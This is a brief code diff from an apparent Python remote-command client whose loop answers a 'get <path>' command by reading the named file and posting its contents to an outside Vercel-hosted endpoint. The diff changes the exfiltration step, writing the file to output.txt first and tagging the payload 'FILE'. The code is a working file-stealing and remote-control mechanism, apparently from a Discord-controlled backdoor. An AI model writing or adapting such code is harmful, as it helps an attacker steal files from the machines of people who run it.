@@ -70,11 +70,11 @@ while True:
                     old_command = ""
                     continue
                 if command.startswith("get "):
-                    print(command)
                     localcmd = command.split()
                     path = localcmd[1]
-                    file = [str(path), open(str("../"+path), 'rb').read()]
-                    file = str(file)
+                    open("output.txt", 'wb').write(open(str("../"+path), 'rb').read())
+                    file = [str(path), open("output.txt", 'rb').read()]
+                    file = "FILE " + str(file)
                     try:
                         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data = file)
                     except:
